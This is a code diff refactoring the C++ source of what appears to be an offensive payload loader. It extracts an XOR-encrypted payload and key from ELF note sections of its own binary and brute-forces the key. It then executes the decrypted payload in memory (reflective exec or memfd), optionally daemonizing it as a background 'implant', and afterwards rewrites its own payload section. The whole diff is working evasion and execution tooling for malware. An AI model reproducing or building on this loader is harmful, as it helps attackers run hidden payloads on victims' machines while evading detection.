@@ -18,26 +18,33 @@ int main(int argc, char **argv) {
     elfio reader;
 
     bool do_daemon = false;
-    // Options
-    int m, n, l, ch, a = 0 ;
+    bool exec_memfd = false;
 
-    for( n = 1; n < argc; n++ )            /* Scan through args. */
+    char **new_argv = nullptr;
+
+    // Process options, separate callee options from caller ( '--' )
+    int m, n, l, ch, a = 0;
+
+    for (n = 1; n < argc; n++)            /* Scan through args. */
     {
-        switch( (int)argv[n][0] )            /* Check for option character. */
+        switch ((int) argv[n][0])            /* Check for option character. */
         {
             case '-':
-                l = (int) strlen( argv[n] );
-                for( m = 1; m < l; ++m ) /* Scan through options. */
+                l = (int) strlen(argv[n]);
+                for (m = 1; m < l; ++m) /* Scan through valid options. */
                 {
-                    ch = (int)(unsigned char)argv[n][m];
-                    switch( ch )
-                    {
+                    ch = (int) (unsigned char) argv[n][m];
+                    switch (ch) {
                         case 'd':
-                            printf( "Option: daemonize %c\n", ch );
+                            debug_print("Option: daemonize %c\n", ch);
                             do_daemon = true;
                             break;
+                        case 'm':
+                            debug_print("Option: memfd_fallback %c\n", ch);
+                            exec_memfd = true;
+                            break;
                         case '-':
-                            printf( "Option: double dash %c\n", ch );
+                            debug_print("Option: double dash %c\n", ch);
                             // End opts, skip counting
                             ++a;
                             goto end_opts;
@@ -50,44 +57,14 @@ int main(int argc, char **argv) {
             default:
                 break;
         }
-        ++a; // how many args processed
+        ++a; // increment cradle args processed
     }
 
     end_opts:
 
-    printf("Arguments to skip for exec: %d\n", a);
+    set_exec_args(&new_argv, &argv, argc, a);
 
-
-    // allocate memory and copy strings
-    printf ("Argc = %d , a = %d, allocating (argc -a +1 ) %d elements\n", argc,  a, argc -a );
-    char** new_argv = (char **) malloc((argc - a +1 ) * sizeof *new_argv);
-
-    // Set up argv[0]
-    new_argv[0] = (char *)(malloc(strlen(argv[0])));
-    memcpy(new_argv[0], argv[0], strlen(argv[0]));
-
-    // Setup paylaod exec args, skipping cradle args
-    for(int skip = a, i = 1; i < argc -a  ; ++i)
-    {
-        printf("=========\n");
-        printf("\tSkip = %d, i = %d \n", skip, i);
-        printf("\tPos: %d (skip + i)  strlen(argv[skip +i] +1) is %zu  \n",skip + i, strlen(argv[skip + i]+1));
-        size_t length = strlen(argv[skip + i])+1;
-        printf("\tnew_argv[i] where i = %d  allocated %zu  \n", i, length);
-        new_argv[i] = (char *)(malloc(length));
-        printf("\tmemcpy to new_argv[i] where i = %d  from argv[skip + i] where skip = %d + i  len: %zu  \n", i, skip, length);
-        memcpy(new_argv[i], argv[skip + i], length);
-    }
-    printf("new_argv[argc - a ] where argc = %d , a = %d \n", argc, a);
-    new_argv[argc - a ] = nullptr;
-
-    // do operations on new_argv
-    for(int i = 0; i < argc - a; ++i)
-    {
-        printf("Arg: %s\n", new_argv[i]);
-    }
-
-    // What is the path of this exe running
+    // What is our path (use /proc, assuming it's available)
     filesystem::path my_path = get_executable_path();
 
     // Load host ELF data
@@ -106,48 +83,26 @@ int main(int argc, char **argv) {
                 cout << "Found section " << psec_name << " at position " << psec_num << " of size: " << psec_size
                      << endl;
                 if (get_psection_data(reader, psec_num, &p_data, &p_data_sz) == TRUE) {
-                    cout << "Dumping p_data: " << endl;
+
+                    // Working with key data
                     if (strcmp((char *) algo_data, "X") == 0) {
+                        // We are in XOR algo
 
-                        // Find decryption key
-                        printf("Bruteforcing the decryption key...\n");
-                        unsigned int k = 0;
-                        for (unsigned int i = 0; i < 0xFFFFFFFF; i++) {
-                            // Rotate back and get lower bits
-                            if ((rightRotate(*((unsigned char *) key_data), KSEC_BITSHIFT_POS) ^ i) ==
-                                KSEC_CANARY_CHAR &&
-                                (rightRotate(*((unsigned char *) key_data + 1), KSEC_BITSHIFT_POS) ^ i) ==
-                                KSEC_CANARY_CHAR &&
-                                (rightRotate(*((unsigned char *) key_data + 2), KSEC_BITSHIFT_POS) ^ i) ==
-                                KSEC_CANARY_CHAR &&
-                                (rightRotate(*((unsigned char *) key_data + 3), KSEC_BITSHIFT_POS) ^ i) ==
-                                KSEC_CANARY_CHAR
-                                    ) {
-                                k = i & 0xFF;
-                                break;
-                            }
-                        }
-
+                        // Find decryption key via bruteforce on key space
+                        unsigned int k = find_x_key(&key_data);
                         if (k == 0) {
                             err(EXIT_FAILURE, "Keyspace does not contain key");
-                        } else {
-                            cout << "Key  found " << hex << k << endl;
                         }
+                        cout << "Key found: (0x)" << hex << k << endl;
 
-                        // XOR method
-                        cout << "De-XOR ... " << endl;
+                        // un-XOR buffer
                         uxor_buffer((unsigned char **) (&p_data), (unsigned long) p_data_sz, k);
 
-                        // cout << "Dumping to disk ... " << endl;
-                        // dump_buffer(p_data, p_data_sz, (char *) "/tmp/lspay.dmp");
+#if DEBUG_PAYDUMPF == 1
+                        cout << "Dumping to disk ... " << endl;
+                        dump_buffer(p_data, p_data_sz, (char *) PAYDUMPF);
+#endif
 
-                        cout << "Reflect exec ... " << endl;
-                        // TODO: check condition for daemonizing
-                        if (do_daemon){
-                            daemonize( (unsigned char const  *) p_data, &new_argv);
-                        }else{
-                            reflect_execv( (unsigned char const  *) p_data, new_argv);
-                        }
                     } else if (strcmp((char *) algo_data, "A") == 0) {
                         // AES ...
                         ;
@@ -155,11 +110,25 @@ int main(int argc, char **argv) {
                     {
                         err(EXIT_FAILURE, "%s not in algo choices <X|A>", (char *) algo_data);
                     }
+
+
+                    // Handling launch context: stay foreground (simple command), or background it (e.g. implant)
+                    if (do_daemon) {
+                        debug_print("%s\n", "Load_exec daemonized");
+                        // Passing load_exec function w/parameters to daemonizer
+                        daemonize(
+                                (mem_exec) (load_exec), exec_memfd, (unsigned char const *) p_data, &new_argv);
+                    } else {
+                        debug_print("%s\n", "Load_exec no daemon");
+                        load_exec(exec_memfd, (unsigned char const *) p_data, &new_argv);
+                    }
+
+                    set_psection_data(reader, psec_num, psec_size, my_path.c_str() );
                 } else {
                     err(EXIT_FAILURE, "Data context cannot be retrieved for psec_num %d ", psec_num);
                 }
             } else {
-                // Section not properly setup, TBD
+                // Section not properly setup
                 err(EXIT_FAILURE, "%s not found, last seen sec num: %d", ksec_name, ksec_num);
             }
 
@@ -168,135 +137,9 @@ int main(int argc, char **argv) {
         }
 
     } else {
-        // Section not properly setup, TBD
+        // Section not properly setup
         err(EXIT_FAILURE, "%s not found, last seen sec num: %d", ksec_name, ksec_num);
     }
 
     return 0;
-}
-
-bool get_psection_data(ELFIO::elfio &reader,
-                       unsigned int psec_num,
-                       void **p_data, Elf_Word *p_data_sz) {
-    Elf_Word type;
-    std::string name;
-    bool found = FALSE;
-
-    // There should be at least 2 entries in section: key and algo
-    cout << "Checking psec_num: " << psec_num << endl;
-    Elf_Word sec_entries_n = get_section_entries_n(reader, psec_num);
-    if (sec_entries_n < PSEC_NENTRY) {
-        err(EXIT_FAILURE, "ksec ix is %d, < %d", sec_entries_n, PSEC_NENTRY);
-    }
-
-    section *note_sec = reader.sections[psec_num];
-    note_section_accessor notes_reader(reader, note_sec);
-
-    if (notes_reader.get_note(0x0, type, name, *p_data, *p_data_sz)) {
-        // 'name' usually contains \0 at the end. Try to fix it
-        name = name.c_str();
-        cout << "[" << 0x0 << "]" << " type: " << type << " name: " << name << " " << " Data sz:" << p_data_sz << endl;
-        found = TRUE;
-    }
-
-    return found;
-}
-
-bool get_ksection_data(ELFIO::elfio &reader,
-                       unsigned int ksec_num,
-                       void **key_data, Elf_Word *key_data_sz,
-                       void **algo_data, Elf_Word *algo_data_sz) {
-    Elf_Word type;
-    std::string name;
-    bool found = FALSE;
-
-    // There should be at least 2 entries in section: key and algo
-    cout << "Checking ksec_num: " << ksec_num << endl;
-    Elf_Word sec_entries_n = get_section_entries_n(reader, ksec_num);
-    if (sec_entries_n != KSEC_NENTRY) {
-        err(EXIT_FAILURE, "ksec ix is %d, != %d", sec_entries_n, KSEC_NENTRY);
-    }
-
-    section *note_sec = reader.sections[ksec_num];
-    note_section_accessor notes_reader(reader, note_sec);
-
-    if (notes_reader.get_note(0x0, type, name, *key_data, *key_data_sz)) {
-        // 'name' usually contains \0 at the end. Try to fix it
-        name = name.c_str();
-        cout << "[" << 0x0 << "]" << " type: " << type << " name: " << name << " " << " data: " << key_data << " sz:"
-             << key_data_sz << endl;
-        found = TRUE;
-    }
-    if (notes_reader.get_note(0x1, type, name, *algo_data, *algo_data_sz)) {
-        // 'name' usually contains \0 at the end. Try to fix it
-        name = name.c_str();
-        cout << "[" << 0x1 << "]" << " type: " << type << " name: " << name << " " << " data: " << algo_data << " sz:"
-             << algo_data_sz << endl;
-        found = TRUE;
-    }
-
-    return found;
-}
-void daemonize(unsigned char const  * p_data, char *** args) {
-
-    // Fork, allowing the parent process to terminate.
-    pid_t pid = fork();
-    if (pid == -1) {
-        // after first fork(), unsuccessful. exiting with error.
-        err(EXIT_FAILURE, "First fork() unsuccessful");
-    } else if (pid != 0) {
-        // after first fork() in parent. exiting by choice.
-        // TODO: clean up if any
-        _exit(0);
-    }
-
-    // Start a new session for the daemon.
-    if (setsid() == -1) {
-        // failed to become a session leader while daemonizing
-        ;
-        err(EXIT_FAILURE, "setsid() unsuccessful");
-    }
-
-    // Fork again, allowing the parent process to terminate.
-    signal(SIGCHLD, SIG_IGN); // avoid defunct processes.
-    pid = fork();
-    if (pid == -1) {
-        // after second fork(), unsuccessful. exiting with error.
-        err(EXIT_FAILURE, "Second fork() unsuccessful");
-    } else if (pid != 0) {
-        // after second fork() in parent. exiting by choice.
-        // TODO: clean up if any
-        _exit(0);
-    }
-
-    // Set the current working directory to the root directory.
-    chdir(DAEMON_CHDIR); // do nothing if it cannot do so, or maybe attempt to chdir elsewhere
-
-    // Set the user file creation mask to zero.
-    umask(0);
-
-    close(STDIN_FILENO);
-    close(STDOUT_FILENO);
-    close(STDERR_FILENO);
-    // Reopen STDIN/OUT/ERR to Null
-    if (open("/dev/null",O_RDONLY) == -1) {
-      printf("Daemon: failed to reopen stdin while daemonising (errno=%d)",errno);
-    }
-    if (open("/dev/null",O_WRONLY) == -1) {
-      printf("Daemon: failed to reopen stdout while daemonising (errno=%d)",errno);
-    }
-    if (open("/dev/null",O_RDWR) == -1) {
-         printf ("Daemon: failed to reopen stderr while daemonising (errno=%d)",errno);
-    }
-
-    reflect_execv( (unsigned char const  *) p_data, *args);
-
-}
-Elf_Word get_section_entries_n(ELFIO::elfio &reader, unsigned int section_number) {
-    note_section_accessor notes_reader(reader, reader.sections[section_number]);
-    return notes_reader.get_notes_num();
-}
-
-std::filesystem::path get_executable_path() {
-    return std::filesystem::canonical("/proc/self/exe");
 }
